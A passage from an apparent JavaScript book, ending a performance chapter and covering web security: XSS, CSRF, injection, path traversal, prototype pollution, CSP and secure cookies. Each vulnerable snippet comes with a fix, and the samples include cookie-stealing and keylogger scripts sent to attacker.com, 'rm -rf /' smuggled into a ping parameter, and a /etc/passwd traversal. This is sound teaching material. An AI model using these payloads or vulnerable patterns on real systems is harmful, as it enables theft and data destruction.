- Code splitting (dynamic imports, webpack configuration, React lazy loading)
- Tree shaking (ES6 modules, side effects, webpack config, bundle analysis)
- Minification (JavaScript with Terser, CSS, HTML)
- Compression (gzip, brotli, pre-compression, image optimization)

These optimizations reduce bundle size, improve load times, and create smooth user experiences.

---

**Related Topics:**

- Service Workers
- Progressive Web Apps
- HTTP/2 and HTTP/3
- CDN Configuration
- Critical CSS

## 23.7 Performance Summary

| Area | Key Techniques |
|------|----------------|
| **JS Engine** | Avoid deopt, use monomorphic functions |
| **Algorithms** | Choose appropriate data structures, reduce complexity |
| **Memory** | Avoid leaks, use WeakMap, pool objects |
| **Rendering** | Minimize reflows, use `requestAnimationFrame` |
| **Bundle** | Code splitting, tree shaking, lazy loading |

---

**End of Chapter 23: Performance Optimization**


# 24-Security-Best-Practices.md

# 24 Security Best Practices

Security is critical for web applications. This chapter covers common vulnerabilities, secure coding practices, authentication, and data protection.

---

# JavaScript Deep Dive: Security


## 24.1 Common Vulnerabilities

Understanding common vulnerabilities helps prevent security breaches.

### Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

#### Types of XSS

**1. Reflected XSS (Non-Persistent)**

```javascript
// VULNERABLE: Reflects user input directly
// URL: https://example.com/search?q=<script>alert('XSS')</script>

app.get('/search', (req, res) => {
  const query = req.query.q;
  
  // DANGEROUS: Unsanitized user input in HTML
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Executes: <h1>Search results for: <script>alert('XSS')</script></h1>
});

// SAFE: Escape user input
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Search results for: ${query}</h1>`);
  // Safe: <h1>Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
});
```

**2. Stored XSS (Persistent)**

```javascript
// VULNERABLE: Stores and displays malicious content
const comments = [];

app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // DANGEROUS: Stores unsanitized input
  comments.push(comment);
  res.json({ success: true });
});

app.get('/comments', (req, res) => {
  // DANGEROUS: Displays stored XSS
  const html = comments.map(c => `<div>${c}</div>`).join('');
  res.send(html);
});

// Attacker posts: <img src=x onerror="alert('XSS')">
// All users viewing comments execute the script

// SAFE: Sanitize on input and escape on output
const DOMPurify = require('isomorphic-dompurify');

app.post('/comment', (req, res) => {
  // Sanitize HTML, remove scripts
  const clean = DOMPurify.sanitize(req.body.comment, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  
  comments.push(clean);
  res.json({ success: true });
});

app.get('/comments', (req, res) => {
  // Still escape for defense in depth
  const html = comments.map(c => escapeHtml(c)).join('');
  res.send(html);
});
```

**3. DOM-Based XSS**

```javascript
// VULNERABLE: Client-side XSS
// URL: https://example.com/#<img src=x onerror="alert('XSS')">

// DANGEROUS: Direct DOM manipulation with user input
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// SAFE: Use textContent instead of innerHTML
const hash = window.location.hash.substring(1);
document.getElementById('output').textContent = hash;

// Or sanitize if HTML is needed
const hash = window.location.hash.substring(1);
const clean = DOMPurify.sanitize(hash);
document.getElementById('output').innerHTML = clean;
```

#### XSS Prevention

```javascript
// 1. Escape output context-appropriately
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function escapeAttribute(text) {
  return text.replace(/["']/g, '&#x22;');
}

function escapeJavaScript(text) {
  return text.replace(/[\\'"]/g, '\\$&').replace(/\n/g, '\\n');
}

// 2. Use safe APIs
// BAD
element.innerHTML = userInput;

// GOOD
element.textContent = userInput;

// BAD
element.setAttribute('href', userInput);

// GOOD - validate URL
const url = new URL(userInput, window.location.origin);
if (url.protocol === 'http:' || url.protocol === 'https:') {
  element.setAttribute('href', url.href);
}

// 3. Use template engines with auto-escaping
// React (auto-escapes by default)
function Comment({ text }) {
  return <div>{text}</div>; // Automatically escaped
}

// To render HTML (use with caution!)
function Comment({ htmlContent }) {
  const clean = DOMPurify.sanitize(htmlContent);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// 4. Content Security Policy
// Set CSP header to prevent inline scripts
// Content-Security-Policy: script-src 'self'
```

#### Real-World XSS Examples

```javascript
// Example 1: Cookie stealing
// Attacker injects:
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Protection: HttpOnly cookies
res.cookie('session', sessionId, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,
  sameSite: 'strict'
});

// Example 2: Keylogger
// Attacker injects:
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// Protection: CSP prevents inline scripts

// Example 3: Page defacement
// Attacker injects:
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>';
</script>

// Protection: Input sanitization and CSP
```

### Cross-Site Request Forgery (CSRF)

CSRF tricks users into performing unwanted actions on a site where they're authenticated.

#### How CSRF Works

```html
<!-- Attacker's malicious site -->
<html>
<body>
  <!-- Victim is logged into bank.com -->
  <!-- This form auto-submits -->
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>

<!-- If bank.com doesn't have CSRF protection, 
     the transfer happens using the victim's session -->
```

#### CSRF Prevention

**1. CSRF Tokens**

```javascript
// Server-side (Express)
const crypto = require('crypto');
const sessions = new Map();

// Generate CSRF token
function generateCsrfToken(sessionId) {
  const token = crypto.randomBytes(32).toString('hex');
  sessions.set(sessionId, token);
  return token;
}

// Middleware to check CSRF token
function csrfProtection(req, res, next) {
  const sessionId = req.cookies.sessionId;
  const token = req.body.csrfToken || req.headers['x-csrf-token'];
  
  const expectedToken = sessions.get(sessionId);
  
  if (!token || token !== expectedToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  next();
}

// Routes
app.get('/form', (req, res) => {
  const sessionId = req.cookies.sessionId;
  const csrfToken = generateCsrfToken(sessionId);
  
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="csrfToken" value="${csrfToken}">
      <input name="to" placeholder="Recipient">
      <input name="amount" placeholder="Amount">
      <button type="submit">Transfer</button>
    </form>
  `);
});

app.post('/transfer', csrfProtection, (req, res) => {
  // Process transfer - protected from CSRF
  const { to, amount } = req.body;
  res.json({ success: true });
});

// Client-side (AJAX)
const csrfToken = document.querySelector('[name=csrfToken]').value;

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to: 'recipient', amount: 100 })
});
```

**2. SameSite Cookie Attribute**

```javascript
// Modern CSRF protection with SameSite cookies
app.use(session({
  secret: 'secret-key',
  cookie: {
    sameSite: 'strict',  // or 'lax'
    secure: true,        // HTTPS only
    httpOnly: true
  }
}));

// SameSite='strict': Cookie not sent on any cross-site request
// SameSite='lax': Cookie sent on safe cross-site requests (GET, not POST)
// SameSite='none': Cookie sent on all cross-site requests (requires Secure)
```

**3. Double Submit Cookie**

```javascript
// Store CSRF token in both cookie and request body
app.get('/api/token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  
  res.cookie('csrf-token', token, {
    sameSite: 'strict',
    secure: true
  });
  
  res.json({ token });
});

app.post('/api/action', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const bodyToken = req.body.csrfToken;
  
  if (!cookieToken || cookieToken !== bodyToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  // Process action
});
```

**4. Checking Origin/Referer Headers**

```javascript
function checkOrigin(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com', 'https://www.example.com'];
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  next();
}

app.post('/api/sensitive', checkOrigin, (req, res) => {
  // Protected endpoint
});
```

### Injection Attacks

Injection attacks insert malicious code into application queries or commands.

#### SQL Injection

```javascript
// VULNERABLE: Concatenating user input
app.get('/user', (req, res) => {
  const userId = req.query.id;
  
  // DANGEROUS: SQL injection possible
  const query = `SELECT * FROM users WHERE id = ${userId}`;
  // Attacker: /user?id=1 OR 1=1
  // Query: SELECT * FROM users WHERE id = 1 OR 1=1
  // Returns all users!
  
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// SAFE: Use parameterized queries
app.get('/user', (req, res) => {
  const userId = req.query.id;
  
  // Safe: Parameters are escaped
  const query = 'SELECT * FROM users WHERE id = ?';
  
  db.query(query, [userId], (err, results) => {
    res.json(results);
  });
});

// Or with named parameters
const query = 'SELECT * FROM users WHERE id = :id';
db.query(query, { id: userId }, (err, results) => {
  res.json(results);
});
```

#### NoSQL Injection

```javascript
// VULNERABLE: MongoDB injection
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // DANGEROUS: Object injection
  // Attacker sends: { username: "admin", password: { $ne: null } }
  // Matches any password!
  db.users.findOne({ username, password }, (err, user) => {
    if (user) {
      res.json({ success: true });
    }
  });
});

// SAFE: Validate input types
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Ensure inputs are strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }
  
  db.users.findOne({ username, password }, (err, user) => {
    if (user) {
      res.json({ success: true });
    }
  });
});

// Or sanitize MongoDB operators
function sanitizeQuery(query) {
  if (typeof query !== 'object' || query === null) {
    return query;
  }
  
  const sanitized = {};
  for (const [key, value] of Object.entries(query)) {
    // Remove MongoDB operators
    if (key.startsWith('$')) {
      continue;
    }
    sanitized[key] = typeof value === 'object' 
      ? sanitizeQuery(value) 
      : value;
  }
  return sanitized;
}
```

#### Command Injection

```javascript
// VULNERABLE: Executing shell commands with user input
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // DANGEROUS: Command injection
  exec(`ping -c 4 ${host}`, (err, stdout) => {
    res.send(stdout);
  });
  // Attacker: /ping?host=google.com;rm -rf /
  // Executes: ping -c 4 google.com;rm -rf /
});

// SAFE: Use spawn with arguments array
const { spawn } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Validate input
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: 'Invalid host' });
  }
  
  // Safe: Arguments are separate
  const ping = spawn('ping', ['-c', '4', host]);
  
  let output = '';
  ping.stdout.on('data', (data) => {
    output += data;
  });
  
  ping.on('close', (code) => {
    res.send(output);
  });
});
```

#### Path Traversal

```javascript
// VULNERABLE: Reading arbitrary files
const fs = require('fs');
const path = require('path');

app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // DANGEROUS: Path traversal
  const filepath = path.join(__dirname, 'files', filename);
  // Attacker: /file?name=../../etc/passwd
  
  fs.readFile(filepath, 'utf8', (err, data) => {
    res.send(data);
  });
});

// SAFE: Validate and normalize path
app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  // Remove any path components
  const safeName = path.basename(filename);
  
  // Resolve full path
  const filepath = path.resolve(__dirname, 'files', safeName);
  const filesDir = path.resolve(__dirname, 'files');
  
  // Ensure file is within allowed directory
  if (!filepath.startsWith(filesDir)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'File not found' });
    }
    res.send(data);
  });
});
```

### Prototype Pollution

Prototype pollution allows attackers to modify Object.prototype, affecting all objects.

#### How Prototype Pollution Works

```javascript
// VULNERABLE: Deep merge function
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker's payload
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');

const user = {};
merge(user, malicious);

// Now ALL objects have isAdmin = true!
const anotherUser = {};
console.log(anotherUser.isAdmin); // true (polluted!)

// Real-world impact
if (someUser.isAdmin) {
  // Grant admin access - security breach!
}
```

#### Prototype Pollution Prevention

```javascript
// SAFE: Check for prototype properties
function safeMerge(target, source) {
  for (const key in source) {
    // Prevent prototype pollution
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// SAFER: Use Object.create(null) for pure data objects
const safeObject = Object.create(null);
// No prototype chain, can't be polluted
safeObject.__proto__ = { isAdmin: true };
console.log(safeObject.isAdmin); // undefined

// SAFEST: Use Map for user-controlled keys
const userData = new Map();
userData.set('__proto__', { isAdmin: true }); // Just a regular entry
console.log(userData.get('isAdmin')); // undefined

// Freeze Object.prototype (nuclear option)
Object.freeze(Object.prototype);
Object.prototype.isAdmin = true; // Silently fails
console.log({}.isAdmin); // undefined

// Use schema validation
const Joi = require('joi');

const schema = Joi.object({
  name: Joi.string().required(),
  age: Joi.number().integer().min(0),
  // Explicitly define allowed properties
}).unknown(false); // Reject unknown properties

const { error, value } = schema.validate(userInput);
if (error) {
  throw new Error('Invalid input');
}
```

#### Real-World Prototype Pollution

```javascript
// CVE example: lodash merge vulnerability (pre-4.17.11)
const _ = require('lodash');

const user = {};
_.merge(user, JSON.parse('{"__proto__": {"isAdmin": true}}'));

console.log({}.isAdmin); // true - prototype polluted!

// Fixed version checks for __proto__
// Always use latest versions and check CVEs

// Defense in depth
function createSafeObject(data) {
  // 1. Validate schema
  if (!isValidSchema(data)) {
    throw new Error('Invalid schema');
  }
  
  // 2. Create object without prototype
  const obj = Object.create(null);
  
  // 3. Copy only allowed properties
  const allowedKeys = ['name', 'email', 'age'];
  for (const key of allowedKeys) {
    if (key in data) {
      obj[key] = data[key];
    }
  }
  
  return obj;
}
```

### Insecure Dependencies

Third-party packages may contain vulnerabilities.

#### Dependency Scanning

```bash
# npm audit - check for known vulnerabilities
npm audit

# View detailed report
npm audit --json

# Automatically fix vulnerabilities
npm audit fix

# Force fix (may include breaking changes)
npm audit fix --force

# yarn alternative
yarn audit

# snyk - more comprehensive
npm install -g snyk
snyk test
snyk monitor
```

#### Package.json Best Practices

```json
{
  "name": "my-app",
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "jest": "^29.0.0"
  },
  "scripts": {
    "audit": "npm audit",
    "audit-fix": "npm audit fix",
    "preinstall": "npm audit"
  },
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  }
}
```

#### Checking Dependencies

```javascript
// Check for known malicious packages
// Use tools like Socket.dev, Snyk, or npm audit

// Verify package integrity
const crypto = require('crypto');
const fs = require('fs');

function verifyPackageIntegrity(packagePath, expectedHash) {
  const fileBuffer = fs.readFileSync(packagePath);
  const hashSum = crypto.createHash('sha256');
  hashSum.update(fileBuffer);
  
  const hex = hashSum.digest('hex');
  
  if (hex !== expectedHash) {
    throw new Error('Package integrity check failed!');
  }
  
  return true;
}

// Use package-lock.json or yarn.lock to ensure reproducible builds
// These files lock exact versions and integrity hashes

// Review dependencies before installing
// Check: downloads, GitHub stars, last update, maintainers
```

#### Supply Chain Attacks

```javascript
// Typosquatting: Similar package names
// Real: "express" vs Malicious: "expres", "express-js"

// Prevention:
// 1. Double-check package names
// 2. Use exact version pinning
{
  "dependencies": {
    "express": "4.18.2"  // Exact version, no ^
  }
}

// 3. Use .npmrc to restrict registry
// .npmrc
registry=https://registry.npmjs.org/

// 4. Enable 2FA for npm account
npm profile enable-2fa auth-and-writes

// 5. Use private registry for internal packages

// 6. Review dependency updates carefully
// Don't blindly accept automated PRs from bots
```

---

## 24.2 Secure Coding Practices

Implementing secure coding practices prevents vulnerabilities.

### Input Validation and Sanitization

Always validate and sanitize user input.

#### Validation Libraries

```javascript
// Joi validation
const Joi = require('joi');

const userSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),
  
  email: Joi.string()
    .email()
    .required(),
  
  password: Joi.string()
    .min(8)
    .pattern(new RegExp('^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#$%^&*])'))
    .required(),
  
  age: Joi.number()
    .integer()
    .min(0)
    .max(150),
  
  website: Joi.string()
    .uri()
});

app.post('/register', (req, res) => {
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ 
      error: error.details[0].message 
    });
  }
  
  // value is validated and sanitized
  createUser(value);
  res.json({ success: true });
});

// express-validator
const { body, validationResult } = require('express-validator');

app.post('/user',
  // Validation rules
  body('email').isEmail().normalizeEmail(),
  body('age').isInt({ min: 0, max: 150 }),
  body('username').trim().escape().isLength({ min: 3, max: 30 }),
  
  (req, res) => {
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Validated input
    res.json({ success: true });
  }
);
```

#### Custom Validation

```javascript
// Type checking
function validateInput(input, schema) {
  for (const [field, rules] of Object.entries(schema)) {
    const value = input[field];
    
    // Required check
    if (rules.required && !value) {
      throw new Error(`${field} is required`);
    }
    
    // Type check
    if (value && rules.type && typeof value !== rules.type) {
      throw new Error(`${field} must be ${rules.type}`);
    }
    
    // Min/max for numbers
    if (rules.type === 'number') {
      if (rules.min !== undefined && value < rules.min) {
        throw new Error(`${field} must be >= ${rules.min}`);
      }
      if (rules.max !== undefined && value > rules.max) {
        throw new Error(`${field} must be <= ${rules.max}`);
      }
    }
    
    // Min/max length for strings
    if (rules.type === 'string') {
      if (rules.minLength && value.length < rules.minLength) {
        throw new Error(`${field} must be at least ${rules.minLength} characters`);
      }
      if (rules.maxLength && value.length > rules.maxLength) {
        throw new Error(`${field} must be at most ${rules.maxLength} characters`);
      }
    }
    
    // Pattern matching
    if (rules.pattern && !rules.pattern.test(value)) {
      throw new Error(`${field} format is invalid`);
    }
    
    // Custom validator
    if (rules.validator && !rules.validator(value)) {
      throw new Error(`${field} validation failed`);
    }
  }
  
  return true;
}

// Usage
const schema = {
  email: {
    required: true,
    type: 'string',
    pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  },
  age: {
    required: true,
    type: 'number',
    min: 0,
    max: 150
  },
  username: {
    required: true,
    type: 'string',
    minLength: 3,
    maxLength: 30,
    pattern: /^[a-zA-Z0-9_]+$/
  }
};

try {
  validateInput(req.body, schema);
  // Process valid input
} catch (error) {
  res.status(400).json({ error: error.message });
}
```

#### Sanitization

```javascript
// HTML sanitization
const DOMPurify = require('isomorphic-dompurify');

function sanitizeHtml(dirty) {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
}

// URL sanitization
function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    
    // Only allow http/https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Invalid protocol');
    }
    
    return parsed.href;
  } catch (error) {
    throw new Error('Invalid URL');
  }
}

// File upload validation
const path = require('path');

function validateUpload(file) {
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
  const allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif'];
  const maxSize = 5 * 1024 * 1024; // 5MB
  
  const ext = path.extname(file.originalname).toLowerCase();
  
  if (!allowedExtensions.includes(ext)) {
    throw new Error('Invalid file type');
  }
  
  if (!allowedMimeTypes.includes(file.mimetype)) {
    throw new Error('Invalid MIME type');
  }
  
  if (file.size > maxSize) {
    throw new Error('File too large');
  }
  
  return true;
}
```

### Output Encoding

Properly encode output based on context.

#### Context-Specific Encoding

```javascript
// HTML context
function encodeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  
  return text.replace(/[&<>"'/]/g, char => map[char]);
}

// HTML attribute context
function encodeHtmlAttribute(text) {
  return text.replace(/["']/g, char => {
    return `&#x${char.charCodeAt(0).toString(16)};`;
  });
}

// JavaScript context
function encodeJavaScript(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '\\x3C')
    .replace(/>/g, '\\x3E');
}

// URL context
function encodeUrl(text) {
  return encodeURIComponent(text);
}

// CSS context
function encodeCss(text) {
  return text.replace(/[^a-zA-Z0-9]/g, char => {
    return `\\${char.charCodeAt(0).toString(16)} `;
  });
}

// Usage examples
const userInput = '<script>alert("XSS")</script>';

// In HTML
const html = `<div>${encodeHtml(userInput)}</div>`;
// <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// In attribute
const attr = `<div title="${encodeHtmlAttribute(userInput)}">`;

// In JavaScript
const js = `<script>const msg = '${encodeJavaScript(userInput)}';</script>`;

// In URL
const url = `<a href="/search?q=${encodeUrl(userInput)}">Search</a>`;
```

#### Template Engines with Auto-Escaping

```javascript
// EJS with auto-escaping
const ejs = require('ejs');

const template = '<div><%= userInput %></div>';
const html = ejs.render(template, { 
  userInput: '<script>alert("XSS")</script>' 
});
// Output: <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// Handlebars with auto-escaping
const Handlebars = require('handlebars');

const template = Handlebars.compile('<div>{{userInput}}</div>');
const html = template({ 
  userInput: '<script>alert("XSS")</script>' 
});
// Output: <div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>

// Raw HTML (use with caution)
const template = Handlebars.compile('<div>{{{userInput}}}</div>');
// Triple braces disable escaping - sanitize first!
const html = template({ 
  userInput: DOMPurify.sanitize(userInput) 
});
```

### Content Security Policy (CSP)

CSP prevents XSS by controlling which resources can be loaded.

#### Basic CSP

```javascript
// Express middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';"
  );
  next();
});

// Helmet.js (recommended)
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Try to avoid unsafe-inline
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    frameAncestors: ["'none'"]
  }
}));
```

#### Advanced CSP

```javascript
// Nonce-based CSP (best for inline scripts)
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate unique nonce for this request
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'; ` +
    `style-src 'self' 'nonce-${res.locals.nonce}';`
  );
  
  next();
});

// In template
// <script nonce="<%= nonce %>">
//   console.log('Allowed by CSP');
// </script>

// Hash-based CSP (for static inline scripts)
const scriptContent = "console.log('Hello');";
const hash = crypto.createHash('sha256')
  .update(scriptContent)
  .digest('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'sha256-${hash}';`
);

// Strict CSP
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'none'"],
    scriptSrc: ["'self'", "'strict-dynamic'"],
    styleSrc: ["'self'"],
    imgSrc: ["'self'"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
    frameAncestors: ["'none'"],
    baseUri: ["'none'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
}));
```

#### CSP Reporting

```javascript
// Report violations
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    reportUri: '/csp-violation-report'
  },
  reportOnly: false  // Set to true to test without blocking
}));

// CSP violation endpoint
app.post('/csp-violation-report', express.json(), (req, res) => {
  const violation = req.body['csp-report'];
  
  console.error('CSP Violation:', {
    blockedUri: violation['blocked-uri'],
    violatedDirective: violation['violated-directive'],
    originalPolicy: violation['original-policy'],
    documentUri: violation['document-uri']
  });
  
  // Log to monitoring service
  // sendToMonitoring(violation);
  
  res.status(204).end();
});
```

### Subresource Integrity (SRI)

SRI ensures that files fetched from CDNs haven't been tampered with.

#### Generating SRI Hashes

```bash
# Generate SRI hash
cat script.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use online tool
# https://www.srihash.org/
```

#### Using SRI

```html
<!-- Script with SRI -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>

<!-- Stylesheet with SRI -->
<link 
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-+/M6kredJcxdsqkczBs+smHyVsocYf/wd9Cv9m1XBp1bBvjC/GBHnTCwsz7sXrNc"
  crossorigin="anonymous">

<!-- Multiple hashes (fallback) -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-hash1 sha512-hash2"
  crossorigin="anonymous">
</script>
```

#### Generating SRI in Build Process

```javascript
// webpack-subresource-integrity plugin
const SriPlugin = require('webpack-subresource-integrity');

module.exports = {
  output: {
    crossOriginLoading: 'anonymous'
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ['sha256', 'sha384'],
      enabled: process.env.NODE_ENV === 'production'
    })
  ]
};

// Manual SRI generation
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filepath, algorithm = 'sha384') {
  const content = fs.readFileSync(filepath);
  const hash = crypto.createHash(algorithm)
    .update(content)
    .digest('base64');
  
  return `${algorithm}-${hash}`;
}

const integrity = generateSRI('./dist/app.js');
console.log(integrity);
// sha384-oqVuAfXRKap7fdgcCY5uykM6+...
```

### HTTPS Enforcement

Always use HTTPS to protect data in transit.

#### Redirecting HTTP to HTTPS

```javascript
// Express middleware
function enforceHTTPS(req, res, next) {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect(301, 'https://' + req.get('host') + req.url);
  }
  next();
}

app.use(enforceHTTPS);

// Or use helmet
app.use(helmet.hsts({
  maxAge: 31536000,  // 1 year
  includeSubDomains: true,
  preload: true
}));
```

#### HSTS Header

```javascript
// Strict-Transport-Security header
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});

// Or use helmet
app.use(helmet());
```

### Secure Cookie Practices

Properly configure cookies to prevent attacks.

#### Secure Cookie Attributes

```javascript
// Setting secure cookies
res.cookie('sessionId', sessionId, {
  httpOnly: true,      // Not accessible via JavaScript
  secure: true,        // Only sent over HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000,     // 1 hour
  path: '/',
  domain: '.example.com'
});

// Session cookie configuration
const session = require('express-session');

app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // Don't use default name
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 3600000
  },
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:'
  })
}));

// Cookie signing
const cookieParser = require('cookie-parser');

app.use(cookieParser(process.env.COOKIE_SECRET));

// Set signed cookie
res.cookie('data', 'value', { signed: true });

// Read signed cookie
const signedCookie = req.signedCookies.data;
```

#### Cookie Prefixes

```javascript
// __Secure- prefix (requires secure flag)
res.cookie('__Secure-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict'
});

// __Host- prefix (requires secure, no domain, path=/)
res.cookie('__Host-sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'strict',
  path: '/'
  // No domain attribute
});
```

---

## Summary

This document covered JavaScript Security comprehensively:

**Common Vulnerabilities:**

- **XSS**: Reflected, stored, and DOM-based XSS with prevention techniques
- **CSRF**: Attack vectors and protection methods (tokens, SameSite, double-submit)
- **Injection**: SQL, NoSQL, command, and path traversal attacks with safe coding practices
- **Prototype Pollution**: How it works and prevention strategies
- **Insecure Dependencies**: Scanning, validation, and supply chain security

**Secure Coding Practices:**

- **Input Validation**: Using validation libraries, custom validation, and sanitization
- **Output Encoding**: Context-specific encoding for HTML, JavaScript, URLs, and CSS
- **Content Security Policy**: Basic and advanced CSP configurations with nonces and reporting
- **Subresource Integrity**: Generating and using SRI hashes for CDN resources
- **HTTPS Enforcement**: Redirecting to HTTPS and HSTS headers
- **Secure Cookies**: HttpOnly, Secure, SameSite attributes, signing, and prefixes

Security requires defense in depth: multiple layers of protection working together.

---

**Related Topics:**

- Authentication and Authorization
- OAuth and JWT Security
- API Security
- Penetration Testing
- Security Headers
# Authentication & Data Protection


## 24.3 Authentication & Authorization

Authentication verifies identity; authorization determines access rights.

### Token-based Authentication (JWT)

JSON Web Tokens provide stateless authentication.

#### JWT Structure

```javascript
// JWT consists of three parts: header.payload.signature
